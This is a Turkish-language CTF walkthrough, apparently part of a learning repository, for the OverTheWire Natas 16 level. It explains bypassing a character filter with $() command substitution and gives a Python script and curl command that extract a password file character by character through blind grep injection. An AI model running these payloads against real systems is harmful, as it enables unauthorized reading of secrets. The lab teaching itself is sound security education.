# 🌐 Web Güvenliği — Command Injection İleri (grep Bypass)

> Natas 16, hem `;`, `|`, `&` karakterlerini hem de tırnak içini filtreliyor.
> Ama grep'in kendi özelliklerini kullanmak hâlâ mümkün.

---

## 📋 İçindekiler

- [Katman 2'den Fark](#katman-2den-fark)
- [Natas 16'nın Filtresi](#natas-16nın-filtresi)
- [grep ile Command Substitution](#grep-ile-command-substitution)
- [Blind Command Injection](#blind-command-injection)
- [Karakter Karakter Şifre Çıkarma](#karakter-karakter-şifre-çıkarma)
- [Python ile Otomatize Etme](#python-ile-otomatize-etme)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## Katman 2'den Fark

Katman 2'deki command injection (Natas 9-10) oldukça basitti:

```
Natas 9:  Filtreleme yok → ; | & hepsi çalışır
Natas 10: ; | & filtrelendi → ama grep trick çalıştı
```

Natas 16 ise hem operatörleri hem de tırnak karakterlerini filtreler — ve girdi tırnak içine alınmıştır. Tamamen farklı bir yaklaşım gerektirir.

---

## Natas 16'nın Filtresi

**Kaynak kod:**

```php
<?php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/', $key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Filtrelenen karakterler: `;`, `|`, `&`, `` ` ``, `'`, `"`

Çalıştırılan komut: `grep -i "$key" dictionary.txt`

Girdi **çift tırnak içinde** — tek tırnaktan çıkamazsın. Çift tırnaktan çıkma karakteri `"` de yasak.

Ama... **`$(...)` filtreli değil!**

---

## grep ile Command Substitution

Bash'te çift tırnak içinde `$(komut)` çalışır:

```bash
echo "Merhaba $(whoami)"
# Merhaba root
```

Yani `grep -i "$(komut)" dictionary.txt` ifadesinde `$(komut)` önce çalışır, çıktısı grep'e pattern olarak gider.

### Temel Fikir

```bash
# Normal:
grep -i "natas" dictionary.txt

# $(cat /etc/natas_webpass/natas17) ile:
grep -i "$(cat /etc/natas_webpass/natas17)" dictionary.txt
```

`$(cat /etc/natas_webpass/natas17)` çalışır → şifreyi döndürür → grep o şifreyi dictionary'de arar.

Şifre dictionary'de yoksa → **hiçbir şey dönmez**.
Şifre dictionary'de varsa → **eşleşen satır döner**.

Bu blind command injection yapar — ama dictionary kelimelerini oracle olarak kullanabiliriz!

---

## Blind Command Injection

### Oracle Mantığı

Dictionary'de `a`, `b`, `c`... ile başlayan kelimeler var. Şifrenin bir karakterinin dictionary'deki bir kelimeyi filtreleyip filtrelemediğini kontrol ederek şifreyi bulabiliriz.

```bash
# Şifrenin ilk karakteri 'a' ise, grep 'a' ile başlayan kelimeleri bulur
grep -i "$(grep -i ^a /etc/natas_webpass/natas17)" dictionary.txt
```

Eğer şifre `a` ile başlamıyorsa → inner grep boş döner → outer grep boş pattern arar → tüm satırları döndürür (veya boş).

Eğer şifre `a` ile başlıyorsa → inner grep şifreyi döndürür → outer grep şifreyi dictionary'de arar → şifre orada yok → boş döner.

Bu sezgisel ama ters mantık — dikkat gerektirir.

---

## Karakter Karakter Şifre Çıkarma

### Doğru Yaklaşım

```
Girdi: $(grep -i ^KARAKTER /etc/natas_webpass/natas17)abcde

Komut: grep -i "$(grep -i ^KARAKTER /etc/natas_webpass/natas17)abcde" dictionary.txt
```

**Eğer şifre KARAKTER ile başlamıyorsa:**
- `$(grep ...)` → boş string
- `grep -i "abcde" dictionary.txt` → dictionary'de "abcde" arar
- "abcde" dictionary'de yok → boş sonuç

**Eğer şifre KARAKTER ile başlıyorsa:**
- `$(grep ...)` → şifreyi döndürür (örn. `W3f28...`)
- `grep -i "W3f28...abcde" dictionary.txt` → bu uzun string dictionary'de yok → boş sonuç

Hmm — iki durumda da boş sonuç. Daha akıllı bir yöntem lazım.

### Düzeltilmiş Yaklaşım

Dictionary'de kesinlikle var olan bir kelime ekle:

```
Girdi: $(grep ^KARAKTER /etc/natas_webpass/natas17)africans
                                                    ↑
                              dictionary'de kesinlikle var olan kelime
```

**Şifre KARAKTER ile BAŞLAMIYORSA:**
- `$(grep ^KARAKTER ...)` → boş
- `grep -i "africans" dictionary.txt` → eşleşme var → "africans" döner ✓

**Şifre KARAKTER ile BAŞLIYORSA:**
- `$(grep ^KARAKTER ...)` → şifre döner (örn. `Wt...`)
- `grep -i "Wt...africans" dictionary.txt` → bu string yok → boş ✗

**Sonuç:**
- Sonuç döndü → şifre bu karakterle **BAŞLAMIYOR**
- Sonuç boş → şifre bu karakterle **BAŞLIYOR** ✓

---

## Python ile Otomatize Etme

```python
import requests
import string

url      = "http://natas16.natas.labs.overthewire.org/"
username = "natas16"
password = "[natas16_şifresi]"

chars    = string.ascii_letters + string.digits
found    = ""
anchor   = "africans"   # dictionary'de kesinlikle var olan kelime

for position in range(1, 33):   # 32 karakterlik şifre
    for c in chars:
        # Şimdiye kadar bulunan prefix + yeni karakter dene
        prefix = found + c
        payload = f"$(grep ^{prefix} /etc/natas_webpass/natas17){anchor}"

        r = requests.get(
            url,
            params={"needle": payload, "submit": "Search"},
            auth=(username, password)
        )

        if anchor not in r.text:
            # anchor sonuçta yok → prefix doğru! → şifre bu karakterle devam ediyor
            found += c
            print(f"[+] Pozisyon {position}: {c} | Şimdiye kadar: {found}")
            break
    else:
        print(f"[!] Pozisyon {position} için karakter bulunamadı")
        break

print(f"\n[✓] Şifre: {found}")
```

---

## Natas'ta Kullanım

### Natas 16 — Tırnak + Operatör Filtreli Injection

**Adım 1: Filtreyi anla**

```python
# Yasak: ; | & ` ' "
# İzinli: $ ( ) / harfler rakamlar boşluk
# Girdi çift tırnak içinde: grep -i "$KEY" dictionary.txt
```

**Adım 2: `$()` çalışıyor mu test et**

```
Girdi: $(echo test)
Komut: grep -i "$(echo test)" dictionary.txt
       → grep -i "test" dictionary.txt
       → "test" içeren satırları gösterir
```

Sonuç geliyorsa `$()` çalışıyor.

**Adım 3: Dictionary anchor belirle**

```
Dictionary'de var olan kısa kelime: "africans", "acid", "act"
```

**Adım 4: Manuel tek karakter testi**

```
Girdi: $(grep ^W /etc/natas_webpass/natas17)africans
```

Sonuç boşsa → şifre `W` ile başlıyor.

```
Girdi: $(grep ^Wa /etc/natas_webpass/natas17)africans
```

Sonuç boşsa → ikinci karakter `a`.

**Adım 5: Python scripti çalıştır**

32 karakterin tamamını otomatik bul.

---

### Komut Satırından Manuel Test

```bash
# Tek karakter test
curl -u natas16:[şifre] \
  "http://natas16.natas.labs.overthewire.org/?needle=\$(grep+^W+/etc/natas_webpass/natas17)africans&submit=Search"

# Boş dönerse → W doğru karakter
```

---

### Özet: Natas 16 Akışı

```
1. Filtreyi analiz et → $() izinli!
2. Dictionary'de anchor kelime bul (africans)
3. Her pozisyon için her karakteri dene:
   payload = $(grep ^[prefix+c] /etc/natas_webpass/natas17)africans
4. Sonuç boşsa → karakter doğru, found'a ekle
5. 32 karakter tamamlanana kadar devam et
```

---

### İleri Command Injection — Kontrol Listesi

```
Filtre analizi:
  ☐ Hangi karakterler yasak? (preg_match'i bul)
  ☐ Girdi tırnak içinde mi? (tek mi çift mi?)
  ☐ $() veya ${} izinli mi?
  ☐ Tırnak içinde hangi yapılar çalışır?

$() varsa:
  ☐ Komut substitution çalışıyor mu? $(echo test)
  ☐ Blind injection için dictionary anchor bul
  ☐ grep ^PREFIX /hedef/dosya kullan

Otomasyon:
  ☐ requests ile Python script yaz
  ☐ anchor kelimesinin response'da olup olmadığını kontrol et
  ☐ Karakter seti: string.ascii_letters + string.digits
```

---

## 🔗 Kaynaklar

- [PortSwigger — OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [Bash — Command Substitution](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

---

**Önceki konu:** [12_blind_sql_injection.md](./12_blind_sql_injection.md)
**Sonraki konu:** [14_session_brute_force.md](./14_session_brute_force.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
